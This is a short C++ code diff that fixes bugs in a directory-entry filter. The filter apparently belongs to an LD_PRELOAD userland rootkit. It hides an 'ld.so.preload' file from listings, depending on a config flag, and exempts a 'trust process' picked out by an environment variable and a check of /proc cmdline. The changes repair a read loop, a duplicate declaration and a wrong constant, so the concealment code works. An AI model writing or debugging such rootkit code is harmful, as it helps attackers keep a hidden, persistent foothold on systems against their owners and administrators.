@@ -17,11 +17,10 @@ bool checkEntry (dirent * dirPtr) {
 	int tmp;
 	const int bufSz = 256;
 	char tmpBuf [bufSz], *chPtr, chData;
-	char *chPtr;
 	
 
 	// To check if the caller is our trust process
-	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) return true;
+	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) return true;
 	
 
 	if (-1 == (*fd = open (("/proc/" + name + "/cmdline").c_str (), O_RDONLY))) {
@@ -29,8 +28,8 @@ bool checkEntry (dirent * dirPtr) {
 		// Is this a ld.so.preload ?
 		if (strstr (dirPtr->d_name, prelFileNameClear) != NULL) {
 			descr_holder fd1 (new int (-1));
-			*fd1 = open (dynCnfFile, O_RDONLY);
-			while ((tmp = read (*fd1, &chData, 1) == -1 && errno == EINTR);
+			*fd1 = open (dynCnfFile.c_str (), O_RDONLY);
+			while ((tmp = read (*fd1, &chData, 1)) == -1 && errno == EINTR);
 			// if we can't read config, we think that preload file doesn't exist
 			if (tmp == -1) return false;
 			if (chData == '1') return true;
